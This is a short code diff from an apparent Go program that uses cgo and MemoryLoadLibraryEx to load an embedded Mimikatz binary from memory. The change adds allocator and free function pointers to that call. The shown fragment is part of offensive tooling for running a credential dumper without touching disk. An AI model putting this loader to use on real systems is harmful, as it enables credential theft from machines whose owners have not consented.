@@ -39,6 +39,8 @@ func main() {
 	handle := C.MemoryLoadLibraryEx(
 		unsafe.Pointer(&mimikatzEXE[0]),           // void *data
 		(C.size_t)(len(mimikatzEXE)),              // size_t
+		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
+		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
 		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
 		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
 		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
